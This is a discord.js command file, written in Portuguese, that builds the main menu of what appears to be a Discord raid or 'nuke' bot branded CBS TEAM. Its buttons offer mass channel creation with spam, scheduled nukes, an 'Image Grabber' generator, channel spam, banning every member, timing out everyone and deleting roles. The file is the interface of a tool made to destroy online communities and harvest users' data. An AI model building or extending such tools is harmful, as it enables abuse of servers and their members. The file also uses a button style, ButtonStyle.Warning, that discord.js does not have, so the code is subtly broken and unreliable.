const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('menu')
    .setDescription('📋 Abre o menu principal com todos os comandos'),

  async execute(interaction, client) {
    try {
      const embed = new EmbedBuilder()
        .setTitle('🔥 CBS TEAM - MENU DE COMANDOS')
        .setDescription('**Clique nos botões abaixo para executar os comandos:**')
        .setColor(0xFF0000)
        .setThumbnail(client.user.displayAvatarURL())
        .addFields(
          { name: '💀 /nuke', value: 'Cria 500 canais + spam', inline: true },
          { name: '⏱️ /timer', value: 'Agenda um /nuke', inline: true },
          { name: '📸 /img', value: 'Gera Image Grabber', inline: true },
          { name: '🗣️ /say', value: 'Envia mensagem/embed', inline: true },
          { name: '🔁 /reverse', value: 'Desfaz o /nuke (dono)', inline: true },
          { name: '📨 /invite', value: 'Link de convite do bot', inline: true },
          { name: '💬 /channelspam', value: 'Spama um canal', inline: true },
          { name: '🔨 /banall', value: 'Bane todos', inline: true },
          { name: '⏰ /end', value: 'Timeout em todos', inline: true },
          { name: '🗑️ /deleterole', value: 'Deleta cargos', inline: true }
        )
        .setFooter({ text: 'CBS TEAM - O PODER É NOSSO!' })
        .setTimestamp();

      const row1 = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setCustomId('menu_nuke')
            .setLabel('💀 NUKE')
            .setStyle(ButtonStyle.Danger),
          new ButtonBuilder()
            .setCustomId('menu_timer')
            .setLabel('⏱️ TIMER')
            .setStyle(ButtonStyle.Primary),
          new ButtonBuilder()
            .setCustomId('menu_img')
            .setLabel('📸 IMG')
            .setStyle(ButtonStyle.Success),
          new ButtonBuilder()
            .setCustomId('menu_say')
            .setLabel('🗣️ SAY')
            .setStyle(ButtonStyle.Secondary)
        );

      const row2 = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setCustomId('menu_reverse')
            .setLabel('🔁 REVERSE')
            .setStyle(ButtonStyle.Danger),
          new ButtonBuilder()
            .setCustomId('menu_invite')
            .setLabel('📨 INVITE')
            .setStyle(ButtonStyle.Success),
          new ButtonBuilder()
            .setCustomId('menu_channelspam')
            .setLabel('💬 SPAM')
            .setStyle(ButtonStyle.Warning),
          new ButtonBuilder()
            .setCustomId('menu_banall')
            .setLabel('🔨 BANALL')
            .setStyle(ButtonStyle.Danger)
        );

      const row3 = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setCustomId('menu_end')
            .setLabel('⏰ END')
            .setStyle(ButtonStyle.Warning),
          new ButtonBuilder()
            .setCustomId('menu_deleterole')
            .setLabel('🗑️ DEL')
            .setStyle(ButtonStyle.Danger)
        );

      await interaction.reply({
        embeds: [embed],
        components: [row1, row2, row3],
        ephemeral: true // ← em vez de flags: 64
      });

    } catch (error) {
      console.error('❌ Erro no menu:', error);
      await interaction.reply({
        content: `❌ Erro ao gerar o menu: ${error.message}`,
        ephemeral: true
      }).catch(() => {});
    }
  }
};